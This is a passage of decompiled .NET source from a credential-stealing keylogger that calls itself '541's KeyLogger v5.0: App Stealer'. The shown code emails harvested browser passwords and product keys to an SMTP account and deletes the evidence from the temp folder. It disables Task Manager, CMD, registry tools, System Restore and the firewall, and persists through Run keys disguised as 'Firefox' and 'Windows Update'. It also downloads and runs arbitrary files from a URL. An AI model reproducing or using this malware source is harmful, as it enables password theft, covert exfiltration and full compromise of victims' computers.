					streamWriter.Close();
					goto IL_54a0;
					IL_54a0:
					num = 1264;
					text = File.ReadAllText(Interaction.Environ("tmp") + "\\App.txt");
					goto IL_54c1;
					IL_54c1:
					num = 1265;
					TextBox4.set_Text("==============================\r\nApplication Product Keys Found\r\n==============================\r\n" + text);
					goto IL_54de;
					IL_54de:
					num = 1266;
					mailMessage = new MailMessage();
					goto IL_54eb;
					IL_54eb:
					num = 1267;
					mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + " :541's KeyLogger v5.0: App Stealer ";
					goto IL_550c;
					IL_550c:
					num = 1268;
					mailMessage.To.Add(rc4(lblUsername.get_Text(), "Hello"));
					goto IL_5533;
					IL_5533:
					num = 1269;
					mailMessage.From = new MailAddress(rc4(lblUsername.get_Text(), "Hello"));
					goto IL_555a;
					IL_555a:
					num = 1270;
					mailMessage.Body = TextBox4.get_Text();
					goto IL_5572;
					IL_5572:
					num = 1271;
					smtpClient = new SmtpClient(lblSMTP.get_Text());
					goto IL_558b;
					IL_558b:
					num = 1272;
					smtpClient.Port = Conversions.ToInteger(lblPort.get_Text());
					goto IL_55a9;
					IL_55a9:
					num = 1273;
					smtpClient.EnableSsl = true;
					goto IL_55b8;
					IL_55b8:
					num = 1274;
					smtpClient.Credentials = new NetworkCredential(rc4(lblUsername.get_Text(), "Hello"), rc4(lblPassword.get_Text(), "Hello"));
					goto IL_55f5;
					end_IL_0001_2:
					break;
				}
				num = 1277;
				Timer7.Stop();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 27191;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Timer8_Tick(object sender, EventArgs e)
	{
		try
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\ChromePass.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\dialup.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\iepv.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\mspass.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\OperaPassView.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\passwordfox.exe");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\App.txt");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\ChromePass.txt");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\du.txt");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\iepv.txt");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\mess.txt");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\OperaPassView.txt");
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Interaction.Environ("tmp") + "\\firefox.txt");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Timer8.Stop();
	}

	public void killProcess(ref string strProcessToKill)
	{
		Process[] processes = Process.GetProcesses();
		int upperBound = processes.GetUpperBound(0);
		int num = 0;
		while (true)
		{
			int num2 = num;
			int num3 = upperBound;
			if (num2 <= num3)
			{
				if (Operators.CompareString(processes[num].ProcessName, strProcessToKill, false) == 0)
				{
					processes[num].Kill();
				}
				num = checked(num + 1);
				continue;
			}
			break;
		}
	}

	private void Timer9_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(lblTaskManager.get_Text(), "Activated", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableTaskMgr", (object)"1", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(lblCMD.get_Text(), "Activated", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(lblRegistryTools.get_Text(), "Activated", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(lblStartUp.get_Text(), "Activated", false) == 0)
			{
				if (File.Exists(WindowsPath + "\\system32\\" + Path.GetFileName(Application.get_ExecutablePath())))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(WindowsPath + "\\system32\\" + Path.GetFileName(Application.get_ExecutablePath()));
				}
				File.Copy(Application.get_ExecutablePath(), WindowsPath + "\\system32\\" + Path.GetFileName(Application.get_ExecutablePath()));
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Firefox", (object)Assembly.GetEntryAssembly()!.Location, RegistryValueKind.String);
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update", (object)(WindowsPath + "\\system32\\" + Path.GetFileName(Application.get_ExecutablePath())), RegistryValueKind.String);
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(lblMelt.get_Text(), "Activated", false) == 0)
			{
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(lblSysRes.get_Text(), "Activated", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Operators.CompareString(lblShow.get_Text(), "Activated", false) == 0)
			{
				string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
				((ServerComputer)MyProject.Computer).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = lblFirewall.get_Text();
			if (Operators.CompareString(text2, "Activated", false) == 0)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "EnableBalloonTips", (object)"0", RegistryValueKind.DWord);
				Process process = new Process();
				string fileName = "netsh.exe";
				process.StartInfo.Arguments = "firewall set opmode disable";
				process.StartInfo.FileName = fileName;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				process.WaitForExit();
			}
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		if (Operators.CompareString(lblDownloader.get_Text(), "Activated", false) == 0)
		{
			try
			{
				if (File.Exists(lblDownloadSP.get_Text() + lblDownloadFN.get_Text()))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(lblDownloadSP.get_Text() + lblDownloadFN.get_Text());
				}
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(lblDownloadURL.get_Text(), lblDownloadSP.get_Text() + lblDownloadFN.get_Text());
				Process.Start(lblDownloadSP.get_Text() + lblDownloadFN.get_Text());
			}
			catch (Exception projectError9)
			{
				ProjectData.SetProjectError(projectError9);
				ProjectData.ClearProjectError();
			}
		}
		Timer9.Stop();
	}
}
